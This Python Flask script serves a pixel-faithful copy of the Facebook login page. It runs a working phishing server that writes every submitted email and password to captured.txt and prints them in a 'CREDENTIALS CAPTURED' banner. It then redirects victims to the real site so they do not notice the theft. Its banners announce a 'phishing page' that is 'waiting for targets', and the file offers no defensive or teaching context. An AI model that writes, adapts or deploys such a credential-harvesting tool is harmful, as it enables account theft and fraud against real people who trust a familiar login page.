from flask import Flask, request, redirect
import datetime
import sys

app = Flask(__name__)

# ANSI color codes for Termux
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'
CLR = '\033[2J\033[H'  # Clear screen + home cursor

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 980px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .header {
            flex: 0 0 50%;
            padding-right: 32px;
        }

        .header h1 {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            color: #1877f2;
            font-size: 56px;
            font-weight: 700;
            letter-spacing: -1px;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 28px;
            line-height: 32px;
            color: #1c1e21;
            font-weight: 400;
        }

        .login-card {
            flex: 0 0 396px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
            padding: 20px 18px;
            text-align: center;
        }

        .login-card form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .login-card input {
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            outline: none;
            transition: border-color 0.2s;
            width: 100%;
        }

        .login-card input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .login-btn {
            background-color: #1877f2;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
            width: 100%;
        }

        .login-btn:hover {
            background-color: #166fe5;
        }

        .forgot-link {
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            margin: 4px 0;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 8px 0;
        }

        .signup-btn {
            display: inline-block;
            background-color: #42b72a;
            color: #fff;
            font-size: 17px;
            font-weight: 700;
            padding: 12px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 0 auto;
            transition: background-color 0.2s;
            width: fit-content;
        }

        .signup-btn:hover {
            background-color: #36a420;
        }

        .footer {
            flex: 0 0 100%;
            text-align: center;
            margin-top: 40px;
            color: #737373;
            font-size: 12px;
        }

        .footer a {
            color: #737373;
            text-decoration: none;
            margin: 0 4px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .footer-links, .copyright {
            margin-top: 8px;
        }

        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                text-align: center;
                gap: 24px;
            }
            .header {
                flex: 0 0 100%;
                padding-right: 0;
            }
            .header h1 {
                font-size: 40px;
            }
            .subtitle {
                font-size: 20px;
            }
            .login-card {
                flex: 0 0 auto;
                width: 100%;
                max-width: 396px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>facebook</h1>
            <p class="subtitle">Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="login-card">
            <form action="/login" method="POST">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
                <a href="#" class="forgot-link">Forgotten password?</a>
                <div class="divider"></div>
                <a href="#" class="signup-btn">Create new account</a>
            </form>
        </div>
        <div class="footer">
            <p><a href="#">English (UK)</a> · <a href="#">Français (France)</a> · <a href="#">More languages</a></p>
            <p class="footer-links"><a href="#">Sign Up</a> · <a href="#">Log In</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a> · <a href="#">Video</a> · <a href="#">Places</a></p>
            <p class="copyright">Meta &copy; 2026</p>
        </div>
    </div>
</body>
</html>'''


def show_creds(email, password, timestamp):
    """Print captured credentials prominently in terminal."""
    banner = f"""
    {RED}{BOLD}╔══════════════════════════════════════════════════╗{RESET}
    {RED}{BOLD}║             🔴 CREDENTIALS CAPTURED             ║{RESET}
    {RED}{BOLD}╚══════════════════════════════════════════════════╝{RESET}

    {CYAN}{BOLD}[+] Timestamp :{RESET}   {WHITE}{timestamp}{RESET}
    {GREEN}{BOLD}[+] Email     :{RESET}   {WHITE}{email}{RESET}
    {YELLOW}{BOLD}[+] Password  :{RESET}   {WHITE}{password}{RESET}

    {RED}{BOLD}────────────────────────────────────────────────{RESET}
    """
    print(banner, file=sys.stderr)


@app.route('/')
def login():
    return HTML_TEMPLATE


@app.route('/login', methods=['POST'])
def capture():
    email = request.form.get('email', '')
    password = request.form.get('pass', '')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Log to file (persistent storage)
    with open('captured.txt', 'a') as f:
        f.write(f"[{timestamp}] Email: {email} | Password: {password}\n")

    # Show in terminal in real-time
    show_creds(email, password, timestamp)

    return redirect('https://www.facebook.com')


if __name__ == '__main__':
    # Print startup banner
    print(f"""
    {GREEN}{BOLD}  ╔═══════════════════════════════════════╗{RESET}
    {GREEN}{BOLD}  ║    FACEBOOK PHISHING PAGE ACTIVE      ║{RESET}
    {GREEN}{BOLD}  ╚═══════════════════════════════════════╝{RESET}

    {CYAN}{BOLD}[*] Server    :{RESET} http://0.0.0.0:8080
    {CYAN}{BOLD}[*] Local     :{RESET} http://127.0.0.1:8080
    {YELLOW}{BOLD}[*] Logging   :{RESET} captured.txt
    {YELLOW}{BOLD}[*] Waiting   :{RESET} for targets... (Ctrl+C to stop)
    {WHITE}{'─' * 50}{RESET}
    """)

    app.run(host='0.0.0.0', port=8080, debug=False)
